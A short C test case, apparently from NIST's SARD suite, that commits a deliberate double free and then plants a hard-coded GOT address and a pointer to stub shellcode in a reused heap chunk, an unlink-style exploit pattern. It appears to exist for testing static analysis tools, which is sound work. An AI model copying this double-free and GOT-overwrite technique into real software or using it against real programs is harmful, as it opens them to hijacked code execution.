/* have 1 double free */

/* spend 4s */

/* Link https://samate.nist.gov/SARD/test-cases/1508/versions/1.0.0 */


#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static char *GOT_LOCATION = (char *)0x0804c98c;
static char shellcode[] = "\xeb\x0cjump12chars_\x90\x90\x90\x90\x90\x90\x90\x90"; //Robert is this right

int main(void)
{
	int size = sizeof(shellcode);
	void *shellcode_location;
	void *first, *second, *third, *fourth;
	void *fifth, *sixth, *seventh;
	shellcode_location = (void *)malloc(size);
	strcpy(shellcode_location, shellcode);
	first = (void *)malloc(256);
	second = (void *)malloc(256);
	third = (void *)malloc(256);
	fourth = (void *)malloc(256);
	free(first);
	free(third);
	fifth = (void *)malloc(128);
	free(first);
	sixth = (void *)malloc(256);
	*((void **)(sixth+0))=(void *)(GOT_LOCATION-12);
	*((void **)(sixth+4))=(void *)shellcode_location;
	seventh = (void *)malloc(256);
	strcpy(fifth, "something");	
	return 0;
}

